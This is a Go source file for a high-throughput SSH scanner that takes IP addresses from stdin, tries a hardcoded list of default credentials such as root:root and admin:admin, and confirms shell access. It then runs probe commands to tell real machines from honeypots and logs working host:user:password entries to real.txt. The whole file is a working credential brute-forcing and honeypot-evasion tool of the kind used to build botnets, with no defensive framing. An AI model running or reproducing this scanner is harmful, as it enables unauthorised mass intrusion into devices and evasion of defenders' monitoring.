package main

import (
	"bufio"
	"bytes"
	"flag"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	realSystems int32
	honeypots   int32
	fails       int32
	closedPorts int32
	tasksActive int32
	totalTasks  int32
	mutex       sync.Mutex
	startTime   = time.Now()
	CheckBusyBoxApplet = 0
	CheckCatProc       = 1
	CheckCommandRun    = 1
	sshPort           string
)

func main() {
	port := flag.String("p", "22", "SSH port to connect to")
	flag.Parse()
	sshPort = *port

	targetChan := make(chan string, 1700000)
	var wg sync.WaitGroup

	go updateStatus()

	rateLimiter := make(chan struct{}, 1850000)
	go func() {
		ticker := time.NewTicker(time.Second / 485000)
		defer ticker.Stop()
		for {
			<-ticker.C
			rateLimiter <- struct{}{}
		}
	}()

	workers := 825000
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(targetChan, rateLimiter, &wg)
	}

	scanner := bufio.NewScanner(os.Stdin)
	count := 0

	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line == "" {
			continue
		}

		parts := strings.Split(line, ",")
		if len(parts) > 0 {
			ip := strings.TrimSpace(parts[0])
			if quickIPCheck(ip) {
				target := net.JoinHostPort(ip, sshPort)
				targetChan <- target
				count++
				atomic.StoreInt32(&totalTasks, int32(count))
			}
		}
	}

	close(targetChan)
	wg.Wait()

	fmt.Printf("\nScan completed. Total: %d | Real Systems: %d | Honeypots: %d | Fails: %d | Closed: %d | Time: %v\n",
		totalTasks, realSystems, honeypots, fails, closedPorts, time.Since(startTime))
}

func quickIPCheck(ip string) bool {
	parts := strings.Split(ip, ".")
	if len(parts) != 4 {
		return false
	}
	for _, part := range parts {
		if num, err := strconv.Atoi(part); err != nil || num < 0 || num > 255 {
			return false
		}
	}
	return true
}

func worker(targetChan <-chan string, rateLimiter <-chan struct{}, wg *sync.WaitGroup) {
	defer wg.Done()
	for target := range targetChan {
		<-rateLimiter
		atomic.AddInt32(&tasksActive, 1)
		testTarget(target)
		atomic.AddInt32(&tasksActive, -1)
	}
}

func testTarget(target string) {
	if !isPortOpen(target) {
		atomic.AddInt32(&closedPorts, 1)
		return
	}

	creds := []struct{ user, pass string }{
		{"root", "root"},
		{"", ""},
		{"root", ""},
		{"admin", "admin"},
		{"user", "user"},
		{"user", "password"},
		{"admin", "1234"},
		{"admin", ""},
	}

	for _, cred := range creds {
		if verifyShellAccess(target, cred.user, cred.pass) {
			if isRealSystem(target, cred.user, cred.pass) {
				atomic.AddInt32(&realSystems, 1)
				mutex.Lock()
				fmt.Printf("\nREAL-SYSTEM: %s (%s:%s)\n", target, cred.user, cred.pass)
				writeToFile("real.txt", fmt.Sprintf("%s:%s:%s", target, cred.user, cred.pass))
				mutex.Unlock()
			} else {
				atomic.AddInt32(&honeypots, 1)
				mutex.Lock()
				fmt.Printf("\nHONEYPOT: %s (%s:%s)\n", target, cred.user, cred.pass)
				writeToFile("honeypot.txt", fmt.Sprintf("%s:%s:%s", target, cred.user, cred.pass))
				mutex.Unlock()
			}
			return
		}
	}
	atomic.AddInt32(&fails, 1)
}

func isPortOpen(target string) bool {
	conn, err := net.DialTimeout("tcp", target, 1500*time.Millisecond)
	if err != nil {
		return false
	}
	conn.Close()
	return true
}

func verifyShellAccess(target, user, pass string) bool {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         1500 * time.Millisecond,
	}

	client, err := ssh.Dial("tcp", target, config)
	if err != nil {
		return false
	}
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return false
	}
	defer session.Close()

	var b bytes.Buffer
	session.Stdout = &b
	session.Run("echo SHELL_TEST")
	output := b.String()

	return strings.Contains(output, "SHELL_TEST")
}

func isRealSystem(target, user, pass string) bool {
	config := &ssh.ClientConfig{
		User: user,
		Auth: []ssh.AuthMethod{
			ssh.Password(pass),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         1500 * time.Millisecond,
	}

	client, err := ssh.Dial("tcp", target, config)
	if err != nil {
		return false
	}
	defer client.Close()

	checksPassed := 0
	requiredChecks := CheckBusyBoxApplet + CheckCatProc + CheckCommandRun

	if CheckBusyBoxApplet == 1 {
		if session, err := client.NewSession(); err == nil {
			var b bytes.Buffer
			session.Stderr = &b
			session.Run("/bin/busybox TEST")
			session.Close()
			output := strings.TrimSpace(b.String())
			if strings.Contains(output, "applet not found") {
				checksPassed++
			}
		}
	}

	if CheckCatProc == 1 {
		if session, err := client.NewSession(); err == nil {
			var b bytes.Buffer
			session.Stderr = &b
			session.Run("cat /proc")
			session.Close()
			output := strings.TrimSpace(b.String())
			if strings.Contains(output, "cat:") {
				checksPassed++
			}
		}
	}

	if CheckCommandRun == 1 {
		if session, err := client.NewSession(); err == nil {
			var b bytes.Buffer
			session.Stderr = &b
			session.Run("./")
			session.Close()
			output := strings.TrimSpace(b.String())
			if !strings.Contains(output, "command not found") && len(output) > 0 {
				checksPassed++
			}
		}
	}

	return checksPassed == requiredChecks
}

func updateStatus() {
	for {
		time.Sleep(2 * time.Second)
		active := atomic.LoadInt32(&tasksActive)
		total := atomic.LoadInt32(&totalTasks)
		real := atomic.LoadInt32(&realSystems)
		hp := atomic.LoadInt32(&honeypots)
		f := atomic.LoadInt32(&fails)
		cp := atomic.LoadInt32(&closedPorts)

		elapsed := time.Since(startTime)
		completed := real + hp + f + cp
		rate := float64(completed) / elapsed.Seconds()

		fmt.Printf("\rActive: %d | Total: %d | Real: %d | Honeypots: %d | Fails: %d | Closed: %d | Rate: %.1f/s",
			active, total, real, hp, f, cp, rate)
	}
}

func writeToFile(filename, data string) {
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	defer file.Close()
	file.WriteString(data + "\n")
}